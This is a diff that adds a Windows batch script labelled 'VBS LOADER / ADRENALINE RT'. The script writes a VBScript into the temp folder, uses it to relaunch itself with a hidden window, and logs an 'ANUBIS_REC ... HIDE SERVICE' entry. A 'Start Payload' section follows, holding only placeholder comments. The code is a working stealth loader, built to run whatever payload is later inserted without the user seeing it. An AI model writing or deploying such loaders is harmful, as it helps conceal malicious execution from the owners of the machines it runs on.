@@ -1,0 +1,30 @@
+REM VBS LOADER
+REM ADRENALINE RT
+REM ########################################
+REM ## -1 Auto_generate vbs code          ##
+REM ## -2 Launch wshell.vbs thisfile.cmd  ##
+REM ########################################
+REM Config:
+set scriptName=thisfile.cmd
+
+REM ######################################################################
+set vbsname=%TMP%\wshell.vbs
+if not exist %vbsname% (
+echo Set objArgs = WScript.Arguments > %vbsname% 
+echo For Each strArg in objArgs >> %vbsname%
+echo     Set WshShell = CreateObject^("WScript.Shell"^) >> %vbsname%
+echo     cmds=WshShell.RUN^(strArg, 0, False^) >> %vbsname%
+echo     Set WshShell = Nothing >> %vbsname%
+echo Next >> %vbsname%
+echo ANUBIS_REC %datanows% HIDE SERVICE WITH VBS>>%TMP%\hideMS.log
+start %vbsname% %TMP%\%scriptName%
+exit
+)
+
+del %vbsname%
+REM ######################################################################
+
+REM Start Payload
+REM ...
+REM ...
+REM End Payload
